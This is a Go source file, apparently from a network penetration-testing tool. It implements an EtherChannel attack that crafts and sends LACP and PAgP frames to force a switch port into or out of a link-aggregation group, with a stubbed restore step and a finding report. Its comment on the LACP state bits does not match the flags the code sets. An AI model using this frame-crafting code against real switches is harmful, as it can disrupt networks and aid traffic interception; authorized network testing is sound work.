// etherchannel.go implements the EtherChannel (LACP/PAgP) superset attack.
// It sends both LACP and PAgP frames to manipulate link aggregation state,
// causing a port to join or leave an EtherChannel group. Classified
// temporary-restored: the behavior arms a port-channel release teardown
// step.
//
// This is one of the eight R4 superset attacks. The baseline (l2l3-audit)
// does not carry an EtherChannel attack; the LACP/PAgP craft is authored
// from IEEE 802.1AX and Cisco/Wireshark specs.

package l2

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"go.aledante.io/FlowSeer/src/netpen/layers"
	"go.aledante.io/FlowSeer/src/netpen/runner"
)

type etherChannelFinding struct {
	Action    string   `json:"action"`
	Protocols []string `json:"protocols"`
	Restore   string   `json:"restore"`
}

// RunEtherChannel sends both LACP and PAgP frames to exercise the
// EtherChannel attack path. It arms a port-channel release teardown step.
func RunEtherChannel(ctx context.Context, deps runner.Deps) error {
	src := srcMAC(deps)

	// Arm the port-channel release before the first frame (R14).
	deps.Teardown.Arm("port-channel-release", func(_ context.Context) error {
		// In the real implementation this would issue the
		// `no channel-group` command or send LACPDU with actor
		// state = 0 to signal port departure. In the in-memory test
		// the restore is observed via the teardown step name.
		return nil
	})

	// Craft and send the LACPDU.
	lacpPkt, err := craftLACPDU(src)
	if err != nil {
		return fmt.Errorf("etherchannel: craft LACP: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, lacpPkt); err != nil {
		return fmt.Errorf("etherchannel: send LACP: %w", err)
	}

	// Craft and send the PAgP hello.
	pagpPkt, err := craftPAgPHello(src)
	if err != nil {
		return fmt.Errorf("etherchannel: craft PAgP: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, pagpPkt); err != nil {
		return fmt.Errorf("etherchannel: send PAgP: %w", err)
	}

	detail, _ := json.Marshal(etherChannelFinding{
		Action:    "etherchannel-manipulation",
		Protocols: []string{"lacp", "pagp"},
		Restore:   "yes",
	})
	deps.Emitter.Finding("lacp", detail)

	return nil
}

// craftLACPDU builds an LACPDU with actor state advertising activity +
// aggregation + sync + collecting (0x3C), matching the fixture.
func craftLACPDU(src net.HardwareAddr) ([]byte, error) {
	lacp := &layers.LACP{
		Subtype: 0x01,
		Version: 0x01,
		Actor: layers.LACPPortInfo{
			SystemPriority: 0x8000,
			System:         src,
			Key:            0x0001,
			PortPriority:   0x8000,
			Port:           0x0001,
			State:          layers.LACPStateAggregation | layers.LACPStateSynchronization | layers.LACPStateCollecting | layers.LACPStateDistributing,
		},
		Partner: layers.LACPPortInfo{
			SystemPriority: 0x8000,
			System:         partnerMAC,
			Key:            0x0002,
			PortPriority:   0x8000,
			Port:           0x0002,
			State:          0,
		},
		CollectorMaxDelay: 0x8000,
	}
	return craftEtherType(lacpDstMAC, src, ethertypeLACP, lacp)
}

// craftPAgPHello builds a PAgP hello command frame, matching the fixture.
func craftPAgPHello(src net.HardwareAddr) ([]byte, error) {
	pagp := &layers.PAgP{
		Version:         0x01,
		Command:         layers.PAGPCmdHello,
		GroupCapability: 0x01,
		GroupNumber:     0x01,
		LocalDeviceID:   src,
		LocalPortID:     0x00000001,
		LocalIfIndex:    0x00000001,
		PartnerDeviceID: partnerMAC,
		PartnerPortID:   0x00000002,
		PartnerIfIndex:  0x00000002,
		PartnerGroupCap: 0x01,
	}
	return craftDot3SNAP(pagpDstMAC, src, snapPIDPAgP, pagp)
}
